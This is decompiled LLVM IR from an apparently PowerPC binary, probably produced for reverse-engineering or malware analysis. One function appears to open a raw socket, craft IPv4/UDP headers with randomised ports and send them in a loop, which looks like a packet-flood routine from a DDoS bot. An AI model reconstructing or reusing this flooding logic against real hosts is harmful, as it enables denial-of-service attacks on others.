dec_label_pc_1000182c:                            ; preds = %dec_label_pc_100017fc
  %v5_10001840 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_1000d184.53 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v3_10001848 = load i8, i8* @global_var_1001045c.9, align 1
  %v3_10001850 = icmp eq i8 %v3_10001848, 0
  %. = select i1 %v3_10001850, i32 ptrtoint ([28 x i8]* @global_var_1000d1ac.55 to i32), i32 ptrtoint ([9 x i8]* @global_var_1000d1a0.54 to i32)
  %v7_1000188c = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_1000d1c8.56 to i32), i32 %arg2, i32 %.)
  br label %dec_label_pc_10001958

dec_label_pc_10001894:                            ; preds = %dec_label_pc_100017fc
  %v3_10001898 = load i8, i8* @global_var_1001045c.9, align 1
  %v3_100018a0 = icmp eq i8 %v3_10001898, 0
  br i1 %v3_100018a0, label %dec_label_pc_100018c4, label %dec_label_pc_100018a8

dec_label_pc_100018a8:                            ; preds = %dec_label_pc_10001894
  %v5_100018bc = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_1000d1ec.58 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_10001958

dec_label_pc_100018c4:                            ; preds = %dec_label_pc_10001894
  %v1_100018c8 = add i32 %arg4, 4
  %v1_100018cc = inttoptr i32 %v1_100018c8 to i32*
  %v2_100018cc = load i32, i32* %v1_100018cc, align 4
  store i32 %v2_100018cc, i32* @r3, align 4
  %v0_100018d4 = call i32 @function_10006ed8()
  %tmp13 = icmp ult i32 %v0_100018d4, 255
  br i1 %tmp13, label %dec_label_pc_10001900, label %dec_label_pc_100018e4

dec_label_pc_100018e4:                            ; preds = %dec_label_pc_100018c4
  %v5_100018f8 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_1000d20c.60 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_10001958

dec_label_pc_10001900:                            ; preds = %dec_label_pc_100018c4
  store i8 1, i8* @global_var_1001045c.9, align 1
  store i32 268441896, i32* @lr, align 4
  %v3_10001924 = call i32 @function_10006e28(i32 ptrtoint (i32* @global_var_10012b24.62 to i32), i32 0, i32 256)
  %v2_10001930 = load i32, i32* %v1_100018cc, align 4
  %v2_10001940 = inttoptr i32 %v2_10001930 to i8*
  %v3_10001940 = call i32 @function_10006eb8(i32 ptrtoint (i32* @global_var_10012b24.62 to i32), i8* %v2_10001940)
  %v5_10001954 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_1000d234.63 to i32), i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 %arg4)
  br label %dec_label_pc_10001958

dec_label_pc_10001958:                            ; preds = %dec_label_pc_100018e4, %dec_label_pc_100018a8, %dec_label_pc_1000182c, %dec_label_pc_10001900
  %v0_1000196c = phi i32 [ %v5_100018f8, %dec_label_pc_100018e4 ], [ %v5_100018bc, %dec_label_pc_100018a8 ], [ %v7_1000188c, %dec_label_pc_1000182c ], [ %v5_10001954, %dec_label_pc_10001900 ]
  ret i32 %v0_1000196c

; uselistorder directives
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 0, 1 }
  uselistorder i32 %arg1, { 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_10001958, { 3, 0, 1, 2 }
}

define i32 @function_10001970(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10001970:
  %v3_10001998 = icmp eq i32 %arg3, 1
  br i1 %v3_10001998, label %dec_label_pc_10001a08, label %dec_label_pc_100019a0

dec_label_pc_100019a0:                            ; preds = %dec_label_pc_10001970
  %v5_100019b4 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_1000d254.64 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v3_100019bc = load i8, i8* @global_var_1001045c.9, align 1
  %v3_100019c4 = icmp eq i8 %v3_100019bc, 0
  %. = select i1 %v3_100019c4, i32 ptrtoint ([28 x i8]* @global_var_1000d1ac.55 to i32), i32 ptrtoint ([9 x i8]* @global_var_1000d1a0.54 to i32)
  %v7_10001a00 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_1000d1c8.56 to i32), i32 %arg2, i32 %.)
  br label %dec_label_pc_10001aa0

dec_label_pc_10001a08:                            ; preds = %dec_label_pc_10001970
  %v3_10001a0c = load i8, i8* @global_var_1001045c.9, align 1
  %v3_10001a14 = icmp eq i8 %v3_10001a0c, 0
  br i1 %v3_10001a14, label %dec_label_pc_10001a1c, label %dec_label_pc_10001a38

dec_label_pc_10001a1c:                            ; preds = %dec_label_pc_10001a08
  %v5_10001a30 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_1000d270.66 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_10001aa0

dec_label_pc_10001a38:                            ; preds = %dec_label_pc_10001a08
  %v1_10001a3c = add i32 %arg4, 4
  %v1_10001a40 = inttoptr i32 %v1_10001a3c to i32*
  %v2_10001a40 = load i32, i32* %v1_10001a40, align 4
  store i32 ptrtoint (i32* @global_var_10012b24.62 to i32), i32* @r3, align 4
  store i32 %v2_10001a40, i32* @r4, align 4
  %v2_10001a50 = call i32 @function_10007360(i32 ptrtoint (i32* @global_var_10012b24.62 to i32), i32 %v2_10001a40)
  %v3_10001a58 = icmp eq i32 %v2_10001a50, 0
  br i1 %v3_10001a58, label %dec_label_pc_10001a7c, label %dec_label_pc_10001a60

dec_label_pc_10001a60:                            ; preds = %dec_label_pc_10001a38
  %v5_10001a74 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_1000d290.68 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_10001aa0

dec_label_pc_10001a7c:                            ; preds = %dec_label_pc_10001a38
  store i8 0, i8* @global_var_1001045c.9, align 1
  %v5_10001a9c = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_1000d2ac.70 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_10001aa0

dec_label_pc_10001aa0:                            ; preds = %dec_label_pc_10001a60, %dec_label_pc_10001a1c, %dec_label_pc_100019a0, %dec_label_pc_10001a7c
  %v0_10001ab4 = phi i32 [ %v5_10001a74, %dec_label_pc_10001a60 ], [ %v5_10001a30, %dec_label_pc_10001a1c ], [ %v7_10001a00, %dec_label_pc_100019a0 ], [ %v5_10001a9c, %dec_label_pc_10001a7c ]
  ret i32 %v0_10001ab4

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_10012b24.62 to i32), { 0, 3, 2, 1 }
  uselistorder i8* @global_var_1001045c.9, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 4, 0, 1 }
  uselistorder i32 %arg1, { 3, 2, 4, 0, 1 }
  uselistorder label %dec_label_pc_10001aa0, { 3, 0, 1, 2 }
}

define i32 @function_10001ab8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10001ab8:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-312 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %stack_var_-320 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10001ab8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10001ab8, i32* %stack_var_-320, align 4
  %v3_10001ae4 = icmp eq i32 %arg3, 1
  br i1 %v3_10001ae4, label %dec_label_pc_10001b20, label %dec_label_pc_10001aec

dec_label_pc_10001aec:                            ; preds = %dec_label_pc_10001ab8
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v5_10001b00 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_1000d2cc.71 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  store i8* null, i8** @global_var_10010460.15, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  store i32 0, i32* @global_var_10010464.16, align 4
  br label %dec_label_pc_10001ce8

dec_label_pc_10001b20:                            ; preds = %dec_label_pc_10001ab8
  %v1_10001b24 = add i32 %arg4, 4
  store i32 %v1_10001b24, i32* %r9.global-to-local, align 4
  %v1_10001b28 = inttoptr i32 %v1_10001b24 to i32*
  %v2_10001b28 = load i32, i32* %v1_10001b28, align 4
  store i32 %v2_10001b28, i32* @r3, align 4
  %v0_10001b30 = call i32 @function_10006ed8()
  %tmp30 = icmp ult i32 %v0_10001b30, 17
  br i1 %tmp30, label %dec_label_pc_10001b5c, label %dec_label_pc_10001b40

dec_label_pc_10001b40:                            ; preds = %dec_label_pc_10001b20
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v5_10001b54 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([75 x i8]* @global_var_1000d2ec.72 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_10001ce8

dec_label_pc_10001b5c:                            ; preds = %dec_label_pc_10001b20
  store i32 %v1_10001b24, i32* %r9.global-to-local, align 4
  %v2_10001b64 = load i32, i32* %v1_10001b28, align 4
  store i32 %v2_10001b64, i32* %r9.global-to-local, align 4
  %v2_10001b68 = ptrtoint i32* %stack_var_-300 to i32
  %v2_10001b74 = inttoptr i32 %v2_10001b64 to i8*
  %v3_10001b74 = call i32 @function_10006eb8(i32 %v2_10001b68, i8* %v2_10001b74)
  store i32 %v2_10001b68, i32* @r3, align 4
  %v0_10001b80 = call i32 @function_10006ed8()
  %v2_10001b8c = ptrtoint i32* %stack_var_-312 to i32
  %v1_10001b88 = add i32 %v2_10001b8c, -1
  %v2_10001b90 = add i32 %v1_10001b88, %v0_10001b80
  store i32 %v2_10001b90, i32* %r9.global-to-local, align 4
  %v1_10001b94 = add i32 %v2_10001b90, 12
  %v2_10001b94 = inttoptr i32 %v1_10001b94 to i8*
  %v3_10001b94 = load i8, i8* %v2_10001b94, align 1
  %v3_10001b9c = icmp eq i8 %v3_10001b94, 46
  br i1 %v3_10001b9c, label %dec_label_pc_10001ba4, label %dec_label_pc_10001c10.preheader

dec_label_pc_10001ba4:                            ; preds = %dec_label_pc_10001b5c
  store i32 %v2_10001b68, i32* @r3, align 4
  %v0_10001bac = call i32 @function_10006ed8()
  %v2_10001bbc = add i32 %v1_10001b88, %v0_10001bac
  store i32 %v2_10001bbc, i32* %r9.global-to-local, align 4
  %v3_10001bc4 = add i32 %v2_10001bbc, 12
  %v4_10001bc4 = inttoptr i32 %v3_10001bc4 to i8*
  store i8 0, i8* %v4_10001bc4, align 1
  br label %dec_label_pc_10001c10.preheader

dec_label_pc_10001c10.preheader:                  ; preds = %dec_label_pc_10001b5c, %dec_label_pc_10001ba4
  store i32 %v2_10001b68, i32* @r3, align 4
  %v0_10001c1c8 = call i32 @function_10006ed8()
  %v2_10001c2410 = icmp eq i32 %v0_10001c1c8, 0
  br i1 %v2_10001c2410, label %dec_label_pc_10001c2c, label %dec_label_pc_10001bdc

dec_label_pc_10001bdc:                            ; preds = %dec_label_pc_10001c10.preheader, %dec_label_pc_10001c04
  %stack_var_-304.014 = phi i32 [ %v1_10001c08, %dec_label_pc_10001c04 ], [ 0, %dec_label_pc_10001c10.preheader ]
  %stack_var_-308.113 = phi i32 [ %stack_var_-308.0, %dec_label_pc_10001c04 ], [ 1, %dec_label_pc_10001c10.preheader ]
  %v2_10001be4 = add i32 %stack_var_-304.014, %v2_10001b8c
  store i32 %v2_10001be4, i32* %r9.global-to-local, align 4
  %v1_10001be8 = add i32 %v2_10001be4, 12
  %v2_10001be8 = inttoptr i32 %v1_10001be8 to i8*
  %v3_10001be8 = load i8, i8* %v2_10001be8, align 1
  %v3_10001bf0 = icmp eq i8 %v3_10001be8, 46
  br i1 %v3_10001bf0, label %dec_label_pc_10001bf8, label %dec_label_pc_10001c04

dec_label_pc_10001bf8:                            ; preds = %dec_label_pc_10001bdc
  store i32 %stack_var_-308.113, i32* %r9.global-to-local, align 4
  %v1_10001bfc = add i32 %stack_var_-308.113, 1
  br label %dec_label_pc_10001c04

dec_label_pc_10001c04:                            ; preds = %dec_label_pc_10001bdc, %dec_label_pc_10001bf8
  %stack_var_-308.0 = phi i32 [ %v1_10001bfc, %dec_label_pc_10001bf8 ], [ %stack_var_-308.113, %dec_label_pc_10001bdc ]
  store i32 %stack_var_-304.014, i32* %r9.global-to-local, align 4
  %v1_10001c08 = add i32 %stack_var_-304.014, 1
  store i32 %v2_10001b68, i32* @r3, align 4
  %v0_10001c1c = call i32 @function_10006ed8()
  %v2_10001c24 = icmp ult i32 %v1_10001c08, %v0_10001c1c
  br i1 %v2_10001c24, label %dec_label_pc_10001bdc, label %dec_label_pc_10001c2c

dec_label_pc_10001c2c:                            ; preds = %dec_label_pc_10001c10.preheader, %dec_label_pc_10001c04
  %stack_var_-308.1.lcssa = phi i32 [ 1, %dec_label_pc_10001c10.preheader ], [ %stack_var_-308.0, %dec_label_pc_10001c04 ]
  %v1_10001c30 = sub i32 4, %stack_var_-308.1.lcssa
  store i32 %v1_10001c30, i32* %r9.global-to-local, align 4
  %v2_10001c8c4 = icmp sgt i32 %v1_10001c30, 0
  %v4_10001c8c6 = icmp eq i32 %v1_10001c30, 0
  br i1 %v2_10001c8c4, label %dec_label_pc_10001c44, label %dec_label_pc_10001c94

dec_label_pc_10001c44:                            ; preds = %dec_label_pc_10001c2c, %dec_label_pc_10001c44
  %storemerge27 = phi i32 [ %v1_10001c7c, %dec_label_pc_10001c44 ], [ 0, %dec_label_pc_10001c2c ]
  store i32 %v2_10001b68, i32* @r3, align 4
  %v0_10001c50 = call i32 @function_10006ed8()
  %v2_10001c58 = add i32 %v2_10001b68, %v0_10001c50
  store i32 %v2_10001c58, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v3_10001c70 = inttoptr i32 %v2_10001c58 to i16*
  store i16 11824, i16* %v3_10001c70, align 2
  %v0_10001c74 = load i32, i32* %r9.global-to-local, align 4
  %v1_10001c74 = trunc i32 %v0_10001c74 to i8
  %v2_10001c74 = load i32, i32* %r11.global-to-local, align 4
  %v3_10001c74 = add i32 %v2_10001c74, 2
  %v4_10001c74 = inttoptr i32 %v3_10001c74 to i8*
  store i8 %v1_10001c74, i8* %v4_10001c74, align 1
  %v1_10001c7c = add nuw nsw i32 %storemerge27, 1
  store i32 %v1_10001c30, i32* %r9.global-to-local, align 4
  %v2_10001c8c = icmp slt i32 %v1_10001c7c, %v1_10001c30
  br i1 %v2_10001c8c, label %dec_label_pc_10001c44, label %dec_label_pc_10001c94

dec_label_pc_10001c94:                            ; preds = %dec_label_pc_10001c44, %dec_label_pc_10001c2c
  store i32 %v2_10001b68, i32* @r3, align 4
  %v2_10001c9c = call i32 @function_10007648(i32 %v2_10001b68, i32 %v1_10001c30)
  store i32 %v2_10001c9c, i32* %stack_var_-312, align 4
  br i1 %v4_10001c8c6, label %dec_label_pc_10001cb4, label %dec_label_pc_10001cc4

dec_label_pc_10001cb4:                            ; preds = %dec_label_pc_10001c94
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10001cdc

dec_label_pc_10001cc4:                            ; preds = %dec_label_pc_10001c94
  %v2_10001ccc = call i32 @function_10000d98(i32 256, i32 %v1_10001c30)
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v3_10001ce0.pre = load i32, i32* %stack_var_-312, align 4
  br label %dec_label_pc_10001cdc

dec_label_pc_10001cdc:                            ; preds = %dec_label_pc_10001cb4, %dec_label_pc_10001cc4
  %v0_10001d0017 = phi i32 [ %v2_10001c9c, %dec_label_pc_10001cb4 ], [ %v2_10001ccc, %dec_label_pc_10001cc4 ]
  %v3_10001ce0 = phi i32 [ %v2_10001c9c, %dec_label_pc_10001cb4 ], [ %v3_10001ce0.pre, %dec_label_pc_10001cc4 ]
  %storemerge = phi i32 [ 1, %dec_label_pc_10001cb4 ], [ %v2_10001ccc, %dec_label_pc_10001cc4 ]
  store i32 %storemerge, i32* @global_var_10010464.16, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v4_10001ce4 = inttoptr i32 %v3_10001ce0 to i8*
  store i8* %v4_10001ce4, i8** @global_var_10010460.15, align 4
  br label %dec_label_pc_10001ce8

dec_label_pc_10001ce8:                            ; preds = %dec_label_pc_10001b40, %dec_label_pc_10001aec, %dec_label_pc_10001cdc
  %v0_10001d00 = phi i32 [ %v5_10001b54, %dec_label_pc_10001b40 ], [ %v5_10001b00, %dec_label_pc_10001aec ], [ %v0_10001d0017, %dec_label_pc_10001cdc ]
  %v2_10001ce8 = load i32, i32* %stack_var_-320, align 4
  store i32 %v2_10001ce8, i32* %r11.global-to-local, align 4
  ret i32 %v0_10001d00

; uselistorder directives
  uselistorder i32 %v2_10001ccc, { 1, 0 }
  uselistorder i32 %v2_10001c9c, { 1, 0, 2 }
  uselistorder i32 %v1_10001c7c, { 1, 0 }
  uselistorder i32 %v1_10001c30, { 3, 6, 5, 4, 0, 1, 2 }
  uselistorder i32 %stack_var_-308.113, { 2, 0, 1 }
  uselistorder i32 %stack_var_-304.014, { 1, 2, 0 }
  uselistorder i32 %v2_10001b68, { 3, 2, 0, 4, 5, 1, 6, 7, 8 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 6, 4, 5, 0, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 (i32, i32)* @function_10000d98, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10001ce8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10001cdc, { 1, 0 }
  uselistorder label %dec_label_pc_10001c44, { 1, 0 }
  uselistorder label %dec_label_pc_10001c2c, { 1, 0 }
  uselistorder label %dec_label_pc_10001c04, { 1, 0 }
  uselistorder label %dec_label_pc_10001bdc, { 1, 0 }
  uselistorder label %dec_label_pc_10001c10.preheader, { 1, 0 }
}

define i32 @function_10001d04(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10001d04:
  store i32 268442920, i32* @lr, align 4
  %v1_10001d24 = call i32 @function_10007770(i32 %arg2)
  store i32 %v1_10001d24, i32* @global_var_1001046c.76, align 4
  %v4_10001d40 = icmp eq i32 %v1_10001d24, -1
  br i1 %v4_10001d40, label %dec_label_pc_10001d48, label %dec_label_pc_10001dbc

dec_label_pc_10001d48:                            ; preds = %dec_label_pc_10001d04
  store i32 268442960, i32* @lr, align 4
  %v2_10001d4c = call i32 @function_100077a4(i32 %arg2, i32 -1)
  %v3_10001d5c = icmp eq i32 %v2_10001d4c, 0
  br i1 %v3_10001d5c, label %dec_label_pc_10001d64, label %dec_label_pc_10001d90

dec_label_pc_10001d64:                            ; preds = %dec_label_pc_10001d48
  %v3_10001d68 = load i32, i32* @global_var_10010478.10, align 4
  %v6_10001d84 = call i32 @function_1000041c(i32 %v3_10001d68, i32 ptrtoint ([33 x i8]* @global_var_1000d33c.77 to i32), i32 %arg1, i32 %arg2)
  %v0_10001d8c = call i32 @function_1000885c()
  br label %dec_label_pc_10001d90

dec_label_pc_10001d90:                            ; preds = %dec_label_pc_10001d48, %dec_label_pc_10001d64
  %v1_10001d94 = add i32 %v2_10001d4c, 16
  %v2_10001d94 = inttoptr i32 %v1_10001d94 to i32*
  %v3_10001d94 = load i32, i32* %v2_10001d94, align 4
  %v1_10001d98 = inttoptr i32 %v3_10001d94 to i32*
  %v2_10001d98 = load i32, i32* %v1_10001d98, align 4
  %v1_10001da8 = add i32 %v2_10001d4c, 12
  %v2_10001da8 = inttoptr i32 %v1_10001da8 to i32*
  %v3_10001da8 = load i32, i32* %v2_10001da8, align 4
  store i32 %v3_10001da8, i32* @r5, align 4
  store i32 268443068, i32* @lr, align 4
  %v4_10001db8 = call i32 @function_10007350(i32 %v2_10001d98, i32 ptrtoint (i32* @global_var_1001046c.76 to i32), i32 %v3_10001da8, i32 %v2_10001d4c)
  %v3_10001dc0.pre = load i32, i32* @global_var_1001046c.76, align 4
  br label %dec_label_pc_10001dbc

dec_label_pc_10001dbc:                            ; preds = %dec_label_pc_10001d04, %dec_label_pc_10001d90
  %v3_10001dc0 = phi i32 [ %v1_10001d24, %dec_label_pc_10001d04 ], [ %v3_10001dc0.pre, %dec_label_pc_10001d90 ]
  ret i32 %v3_10001dc0

; uselistorder directives
  uselistorder i32 %v3_10001da8, { 1, 0 }
  uselistorder i32 %v2_10001d4c, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10001dbc, { 1, 0 }
  uselistorder label %dec_label_pc_10001d90, { 1, 0 }
}

define i32 @function_10001de0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10001de0:
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-1552 = alloca i32, align 4
  %stack_var_-1508 = alloca i32, align 4
  %stack_var_-1516 = alloca i32, align 4
  %stack_var_-1536 = alloca i32, align 4
  store i32 268443156, i32* @lr, align 4
  %v1_10001e10 = call i32 @function_10004a90(i32 0)
  %v1_10001e20 = call i32 @function_100004f0(i32 %arg2)
  %v3_10001e28 = icmp eq i32 %v1_10001e20, 0
  br i1 %v3_10001e28, label %dec_label_pc_10001e30, label %dec_label_pc_10002108

dec_label_pc_10001e30:                            ; preds = %dec_label_pc_10001de0
  store i32 268443200, i32* @lr, align 4
  %v3_10001e3c = call i32 @function_10007cbc(i32 2, i32 3, i32 255)
  %tmp32 = icmp sgt i32 %v3_10001e3c, -1
  br i1 %tmp32, label %dec_label_pc_10001e5c, label %dec_label_pc_10001e54

dec_label_pc_10001e54:                            ; preds = %dec_label_pc_10001e30
  %v0_10001e58 = call i32 @function_1000885c()
  br label %dec_label_pc_10001e5c

dec_label_pc_10001e5c:                            ; preds = %dec_label_pc_10001e30, %dec_label_pc_10001e54
  %v2_10001e60 = icmp sgt i32 %arg3, 2
  br i1 %v2_10001e60, label %dec_label_pc_10001e88, label %dec_label_pc_10001e68

dec_label_pc_10001e68:                            ; preds = %dec_label_pc_10001e5c
  %v5_10001e7c = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_1000d360.79 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v0_10001e84 = call i32 @function_1000885c()
  br label %dec_label_pc_10001e88

dec_label_pc_10001e88:                            ; preds = %dec_label_pc_10001e5c, %dec_label_pc_10001e68
  %v1_10001e8c = add i32 %arg4, 4
  %v1_10001e90 = inttoptr i32 %v1_10001e8c to i32*
  %v2_10001e90 = load i32, i32* %v1_10001e90, align 4
  store i32 268443296, i32* @lr, align 4
  %v3_10001e9c = call i32 @function_10001d04(i32 %arg2, i32 %v2_10001e90, i32 %v1_10001e8c)
  %v1_10001eac = add i32 %arg4, 8
  %v1_10001eb0 = inttoptr i32 %v1_10001eac to i32*
  %v2_10001eb0 = load i32, i32* %v1_10001eb0, align 4
  store i32 268443324, i32* @lr, align 4
  %v2_10001eb8 = inttoptr i32 %v2_10001eb0 to i8*
  %v3_10001eb8 = call i32 @function_10008694(i8* %v2_10001eb8, i32 %v1_10001eac)
  %v1_10001ec8 = add i32 %arg4, 12
  %v1_10001ecc = inttoptr i32 %v1_10001ec8 to i32*
  %v2_10001ecc = load i32, i32* %v1_10001ecc, align 4
  store i32 268443352, i32* @lr, align 4
  %v2_10001ed4 = inttoptr i32 %v2_10001ecc to i8*
  %v3_10001ed4 = call i32 @function_10008694(i8* %v2_10001ed4, i32 %v1_10001ec8)
  %v2_10001ee0 = ptrtoint i32* %stack_var_-1536 to i32
  %v2_10001eec = ptrtoint i32* %stack_var_-1516 to i32
  %tmp33 = bitcast i32* %stack_var_-1516 to i16*
  %v2_10001ef8 = ptrtoint i32* %stack_var_-1508 to i32
  store i32 268443408, i32* @lr, align 4
  %v3_10001f0c = call i32 @function_10006e28(i32 %v2_10001ef8, i32 10, i32 1472)
  %v2_10001f18 = load i32, i32* %v1_10001e90, align 4
  %v6_10001f34 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_1000d388.81 to i32), i32 %arg2, i32 %v2_10001f18)
  %v1_10001f44 = call i32 @__asm_rlwimi(i32 5, i32 28, i32 0, i32 3)
  store i32 %v1_10001f44, i32* %stack_var_-1536, align 4
  %v1_10001f58 = call i32 @__asm_rlwimi(i32 4, i32 24, i32 4, i32 7)
  store i32 %v1_10001f58, i32* %stack_var_-1536, align 4
  %v3_10001f68 = or i32 %v2_10001ee0, 1
  %v4_10001f68 = inttoptr i32 %v3_10001f68 to i8*
  store i8 0, i8* %v4_10001f68, align 1
  %v3_10001f74 = or i32 %v2_10001ee0, 2
  %v4_10001f74 = inttoptr i32 %v3_10001f74 to i16*
  store i16 1500, i16* %v4_10001f74, align 2
  %v3_10001f80 = add i32 %v2_10001ee0, 6
  %v4_10001f80 = inttoptr i32 %v3_10001f80 to i16*
  store i16 0, i16* %v4_10001f80, align 2
  %v3_10001f8c = add i32 %v2_10001ee0, 9
  %v4_10001f8c = inttoptr i32 %v3_10001f8c to i8*
  store i8 17, i8* %v4_10001f8c, align 1
  %v3_10001f98 = add i32 %v2_10001ee0, 8
  %v4_10001f98 = inttoptr i32 %v3_10001f98 to i8*
  store i8 64, i8* %v4_10001f98, align 4
  %v2_10001fa4 = add i32 %v2_10001ee0, 16
  %v3_10001fa4 = inttoptr i32 %v2_10001fa4 to i32*
  store i32 %v3_10001e9c, i32* %v3_10001fa4, align 4
  %v1_10001fac = urem i32 %tmp10, 65536
  store i32 %v1_10001fac, i32* @r3, align 4
  %v1_10001fb4 = call i32 @function_10007644(i32 %v1_10001fac)
  %v1_10001fc0 = trunc i32 %v1_10001fb4 to i16
  %v3_10001fc0 = add i32 %v2_10001eec, 4
  %v4_10001fc0 = inttoptr i32 %v3_10001fc0 to i16*
  store i16 %v1_10001fc0, i16* %v4_10001fc0, align 4
  store i32 2, i32* %stack_var_-1552, align 4
  %v3_10001fec = icmp eq i32 %v3_10001eb8, 0
  %v3_10002024 = or i32 %v2_10001eec, 2
  %v4_10002024 = inttoptr i32 %v3_10002024 to i16*
  %v2_10002034 = bitcast i32* %stack_var_-1536 to i16*
  %v3_10002040 = add i32 %v2_10001eec, 6
  %v4_10002040 = inttoptr i32 %v3_10002040 to i16*
  %v2_10002050 = add i32 %v2_10001ee0, 12
  %v3_10002050 = inttoptr i32 %v2_10002050 to i32*
  %v3_10002064 = add i32 %v2_10001ee0, 4
  %v4_10002064 = inttoptr i32 %v3_10002064 to i16*
  %v3_10002080 = add i32 %v2_10001ee0, 10
  %v4_10002080 = inttoptr i32 %v3_10002080 to i16*
  %v2_10002094 = ptrtoint i32* %stack_var_-1552 to i32
  %v2_100020dc = add i32 %v3_10001ed4, %v1_10001e10
  %v1_10001ff8 = urem i32 %v3_10001eb8, 65536
  br label %dec_label_pc_10001fd4

dec_label_pc_10001fd4:                            ; preds = %dec_label_pc_100020f8, %dec_label_pc_10001e88
  %stack_var_-1560.0 = phi i32 [ 0, %dec_label_pc_10001e88 ], [ %v1_100020fc, %dec_label_pc_100020f8 ]
  store i32 268443608, i32* @lr, align 4
  %v0_10001fd4 = call i32 @function_1000815c()
  %v1_10001fe4 = trunc i32 %v0_10001fd4 to i16
  store i16 %v1_10001fe4, i16* %tmp33, align 4
  br i1 %v3_10001fec, label %dec_label_pc_10002014, label %dec_label_pc_10001ff4

dec_label_pc_10001ff4:                            ; preds = %dec_label_pc_10001fd4
  store i32 %v1_10001ff8, i32* @r3, align 4
  %v1_10002000 = call i32 @function_10007644(i32 %v1_10001ff8)
  %extract.t = trunc i32 %v1_10002000 to i16
  br label %dec_label_pc_10002028

dec_label_pc_10002014:                            ; preds = %dec_label_pc_10001fd4
  store i32 268443672, i32* @lr, align 4
  %v0_10002014 = call i32 @function_1000815c()
  %extract.t41 = trunc i32 %v0_10002014 to i16
  br label %dec_label_pc_10002028

dec_label_pc_10002028:                            ; preds = %dec_label_pc_10001ff4, %dec_label_pc_10002014
  %v1_10002004.sink.off0 = phi i16 [ %extract.t, %dec_label_pc_10001ff4 ], [ %extract.t41, %dec_label_pc_10002014 ]
  store i16 %v1_10002004.sink.off0, i16* %v4_10002024, align 2
  %v3_10002034 = call i32 @function_10000e28(i16* %v2_10002034, i32 1500)
  %sext3 = mul i32 %v3_10002034, 65536
  %v1_10002038 = sdiv i32 %sext3, 65536
  %v1_10002040 = trunc i32 %v1_10002038 to i16
  store i16 %v1_10002040, i16* %v4_10002040, align 2
  %v0_10002044 = call i32 @function_1000066c()
  store i32 %v0_10002044, i32* %v3_10002050, align 4
  store i32 268443736, i32* @lr, align 4
  %v0_10002054 = call i32 @function_1000815c()
  %v1_10002064 = trunc i32 %v0_10002054 to i16
  store i16 %v1_10002064, i16* %v4_10002064, align 4
  %v3_10002074 = call i32 @function_10000e28(i16* %v2_10002034, i32 1500)
  %v1_10002080 = trunc i32 %v3_10002074 to i16
